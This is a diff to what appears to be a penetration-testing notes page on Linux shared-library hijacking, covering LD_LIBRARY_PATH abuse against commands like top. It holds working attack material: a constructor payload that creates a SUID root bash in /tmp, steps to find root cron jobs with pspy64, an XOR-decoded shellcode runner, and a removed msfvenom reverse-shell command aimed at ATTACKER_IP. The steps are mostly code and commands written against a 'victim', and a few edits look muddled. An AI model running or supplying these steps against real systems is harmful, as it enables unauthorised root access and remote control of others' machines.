@@ -62,7 +62,7 @@ void runmahpayload() {
 }
 ```
 
-2. Compile the payload:
+2. Compile the payload (use the [[Compiling Payloads]] technique):
 ```bash
 gcc -Wall -fPIC -c -o hax.o hax.c
 
@@ -83,7 +83,11 @@ gcc -shared -o libhax.so hax.o
 # Format: lib<libraryname>.so.1 (the appended number is a version number)
 ```
 
-4. Locate a program that the victim is likely to use as root specially (make sure the hijack doesnt break anything). For example the top command, which is likely used with elevated privileges to display processes with elevated permissions.
+4. Locate a program that the victim is likely to use as root/sudo specially (make sure the hijack doesnt break anything). For example the top command, which is likely used with elevated privileges to display processes with elevated permissions. We can also monitor for cron jobs that execute programs as root using sudo with our current user:
+```bash
+$ pspy64
+```
+
 5. Enumerate libraries loaded by the selected program:
 ```bash
 $ ldd /usr/bin/top
@@ -102,7 +106,7 @@ $ ldd /usr/bin/top
 	libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007ff5aa0f8000)
 ```
 
-The last library looks like its only loaded when the program encounters an error, so it likely wont break anything.
+The last library looks like its only loaded when the program encounters an error, so it likely wont break anything. If no library looks like standard, we can select any of the other libraries.
 
 6. Lets modify the environment variable to point to our folder containing the malicious library and rename the library as the expected:
 ```bash
@@ -128,7 +132,7 @@ This means that when the program loads the library, before calling the construct
 
 The library might contain library symbols for other libraries that are imported. We dont care about those. We only care about symbols from the target library. In the example above, we are looking for symbols from GPG_ERROR_1.0
 
-8. Locate missing library symbols from the original library file:
+8. Locate missing library symbols from the original library file (optional):
 ```bash
 $ readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
 
@@ -149,7 +153,7 @@ int gpgrt_poll;
 # sed: replace the version information with ;
 ```
 
-9. Modify our library code to include the missing symbols:
+9. Modify our library code to include the missing symbols (optional):
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -163,7 +167,7 @@ int gpgrt_feof_unlocked;
 ...
 ```
 
-10. Recompile and execute. If we receive that a symbol is missing a version information like below:
+10. Recompile and execute. If we receive that a symbol is missing a version information like below (optional):
 ```
 $ top
 top: /home/offsec/ldlib/libgpg-error.so.0: no version information available (required by /lib/x86_64-linux-gnu/libgcrypt.so.20)
@@ -180,7 +184,7 @@ gpgrt_vbsprintf;
 ...
 ```
 
-11. Wrap the symbols into a symbol map (`gpg.map`) for the compiler to use:
+11. Wrap the symbols into a symbol map (`gpg.map`) for the compiler to use (optional):
 ```bash
 GPG_ERROR_1.0 {
 gpgrt_onclose;
@@ -197,6 +201,8 @@ gpgrt_poll;
 gcc -Wall -fPIC -c -o hax.o hax.c
 
 gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o
+
+# If we skipped the symbol errors steps, we can just compile normally
 ```
 
 13. Set the environment variable and run the program:
@@ -204,6 +210,28 @@ gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o
 export LD_LIBRARY_PATH=/home/offsec/ldlib/
 
 $ top
+```
+
+**Privileged SUID Bash (recommended)**
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h> // for setuid/setgid
+
+static void runmahpayload() __attribute__((constructor)); // telling compiler that this function will be defined later
+
+void runmahpayload() {
+	setuid(0);
+	setgid(0);
+	printf("DLL HIJACKING IN PROGRESS \n");
+	system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash");
+}
+```
+
+Once the bash file is created, run:
+```bash
+$ /tmp/bash -p
 ```
 
 **Shellcode Runner in C**
@@ -252,43 +280,7 @@ gcc -o encoder.out encoder.c
 ./encoder.out
 ```
 
-4. Perform steps 7,8,9 and 11 from the previous section.
-
-5. Encode the payload with the following encoder:
-```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-
-// $ msfvenom LHOST=ATTACKER_IP LPORT=LOCAL_PORT -p linux/x64/meterpreter/reverse_tcp -f c -o met.c
-unsigned char buf[] = 
-"\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31\xff\x6a\x3c"
-...
-"\xe6";
-
-int main (int argc, char **argv) 
-{
-	char xor_key = 'J';
-	int payload_length = (int) sizeof(buf);
-
-	for (int i=0; i<payload_length; i++)
-	{
-		printf("\\x%02X",buf[i]^xor_key);
-	}
-
-	return 0;
-
-}
-```
-
-7. Compile the encoder and run it:
-```bash
-gcc -o encoder.out encoder.c
-
-./encoder.out
-```
-
-8. Write the following C payload:
+4. Write the following C payload:
 ```c
 #define _GNU_SOURCE
 #include <sys/mman.h>
@@ -338,16 +330,20 @@ void runmahpayload(void) {
 }
 ```
 
-5. Compile the shared library again including the symbol file:
+5. Perform steps 7,8,9,10, 11 from the previous section.
+
+6. Compile the shared library again including the symbol file:
 ```bash
 gcc -Wall -fPIC -c -o hax.o hax.c
 
 gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o
 ```
 
-6. Set the environment variable and run the program:
+7. Set the environment variable and run the program:
 ```bash
 export LD_LIBRARY_PATH=/home/offsec/ldlib/
+
+$ mv hax.o LIBRARY_NAME
 
 $ top
 ```
@@ -517,14 +513,6 @@ uid_t geteuid(void)
 	if (fork() == 0) {
 		// new process (fork branch)
 		
-		// decode the payload
-		char xor_key = 'J';
-		int arraysize = (int) sizeof(buf);
-		for (int i=0; i<arraysize-1; i++)
-		{
-			buf[i] = buf[i]^xor_key;
-		}
-		
 		// check that the shellcode resides on an executable memory page before executing it:
         intptr_t pagesize = sysconf(_SC_PAGESIZE); // get the size of a memory page
         // change the page of memory that contains our shellcode and make it executable
@@ -532,6 +520,15 @@ uid_t geteuid(void)
             perror("mprotect");
             return -1;
         }
+        
+        // decode the payload
+		char xor_key = 'J';
+		int arraysize = (int) sizeof(buf);
+		for (int i=0; i<arraysize-1; i++)
+		{
+			buf[i] = buf[i]^xor_key;
+		}
+        
         int (*ret)() = (int(*)())buf;
         ret();
     }
